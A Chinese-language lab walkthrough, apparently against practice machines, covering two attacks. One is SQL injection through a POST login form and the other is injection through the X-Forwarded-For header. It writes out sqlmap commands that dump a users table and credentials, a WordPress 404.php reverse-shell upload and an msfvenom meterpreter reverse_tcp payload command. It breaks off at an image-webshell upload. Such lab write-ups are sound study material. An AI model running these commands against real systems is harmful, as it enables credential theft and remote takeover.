# SQL注入（POST）

## 信息收集

靶机IP地址192.168.1.8

![73699794172](assets/1736997941724.png)

nmap扫描靶机

> nmap -T4 -A -v  IP地址

![73699804243](assets/1736998042438.png)

http协议开放了两个端口：80端口和8080端口

## 目录扫描

浏览器分别打开80端口和8080端口

### 80端口

![73699817148](assets/1736998171483.png)

查看了源代码也没有得到什么有用信息

目录扫描：

![73699826822](assets/1736998268228.png)

发现80端口下运行着phpmyadmin

还有一个login.php界面

![73699951076](assets/1736999510769.png)

### 8080端口

![73699836445](assets/1736998364455.png)

似乎是一个电商平台

目录扫描：
![73699845182](assets/1736998451823.png)

发现wordpress下还有很多目录，我们可以找一下比较敏感的目录，比如admin

因此我们尝试访问一下http://192.168.1.8:8080/wordpress/admin

![73699852242](assets/1736998522426.png)

进入到了一个异常熟悉的界面

## 爆数据库

> phpMyadmin通过web界面管理mysql等数据库
>
> 因此我们看看能不能通过80端口中运行的phpMyadmin爆破出数据库中的信息，然后登录进wp

这里我们使用sqlmap读取login.php报文进行爆破

### 抓取报文

用bp抓取请求报文，保存在文件request.raw

![73699971023](assets/1736999710236.png)

### 爆数据

> sqlmap -r request.raw --level 5 --risk 3 --dbs --dbms mysql --batch

![73700109611](assets/1737001096117.png)

爆出了这些数据库，我们找敏感的数据库，显然是wordpress8080

> sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 --tables --batch

![73700371000](assets/1737003710008.png)

爆出了users表

>sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 -T users --columns --batch

![73700386803](assets/1737003868039.png)

爆出了两个字段，分别是用户名和密码

> sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080  -T users -C username,password --dump --batch

![73700406968](assets/1737004069686.png)

爆出了账号密码

admin:SuperSecretPassword

## 上传webshell

我们尝试用账号密码登入进wp

![73700415312](assets/1737004153123.png)

成功登录

上传webshell木马

### 生成webshell木马

这次不使用msf生成，而是在Kali自带的usr/share/webshells中获取

![73700456171](assets/1737004561712.png)

将我们要使用的php-reverse-shell.php拷贝一份到桌面

对其进行修改：

![73700464358](assets/1737004643585.png)

修改攻击机IP地址和监听端口

### 上传webshell

然后将webshell上传到wp的404.php中

![73700479974](assets/1737004799744.png)

### 开启监听

![73700489697](assets/1737004896979.png)

要反弹shell我们要先执行shell

> http://靶场IP地址:端口号/目录/wp-content/themes/主题名/404.php

http://192.168.1.8:8080/wordpress/wp-content/themes/TwentyThirteen/404.php

成功反弹shell

![73700509637](assets/1737005096373.png)

## 提权

![73700521096](assets/1737005210968.png)

本来想着有没有可以利用的用户，结果意外发现可以直接用我们刚才爆破得到的密码进行提权，拿到root权限。

# SQL注入(X-Forworded-For)

## X-Forworded-For简述

X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP头字段。

> 这一HTTP头一般格式如下:
>
> X-Forwarded-For: client1, proxy1, proxy2

XFF字段会直接插入到SQL语句当中执行，所以攻击者可以通过篡改XFF字段获得数据库的隐私数据。

## 信息收集

不再过多阐述，放几张截图：

![73704255350](assets/1737042553500.png)

![73704261532](assets/1737042615321.png)

只开放了80端口

## 目录扫描

![73704268736](assets/1737042687367.png)

访问/admin，进入登录界面/admin/login.php

![73704272309](assets/1737042723095.png)

## 漏洞扫描

AWVS工具扫描web网站

![73704414658](assets/1737044146582.png)

存在SQL注入漏洞且明确说明了问题出在了XFF的输入上

## 爆数据库

> sqlmap -u "http://192.168.1.10"  -headers="X-Forwarded-For:*" --dbs --batch

![73711650472](assets/1737116504722.png)

> sqlmap -u "http://192.168.1.10" -headers="X-Forwarded-For:*" -D photoblog --tables --batch

![73711677124](assets/1737116771246.png)

> sqlmap -u "http://192.168.1.10" -headers="X-Forwarded-For:*" -D photoblog -T users --columns --batch

![73711737112](assets/1737117371127.png)

> sqlmap -u "http://192.168.1.10" -headers="X-Forwarded-For:*" -D photoblog -T users -C password --dump --batch

![73711774934](assets/1737117749349.png)

## 反弹shell

登录成功后进入如下页面：

![73711779541](assets/1737117795411.png)

我们可以利用msf生成webshell木马上传以反弹shell获得权限

### 生成webshell

> msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.13  lport=4444 -f raw

![73711844094](assets/1737118440944.png)

### 上传webshell

![73711849405](assets/1737118494050.png)

上传失败，显示只能上传gif,png,jpg三种文件

我们尝试一下能不能制作图片马










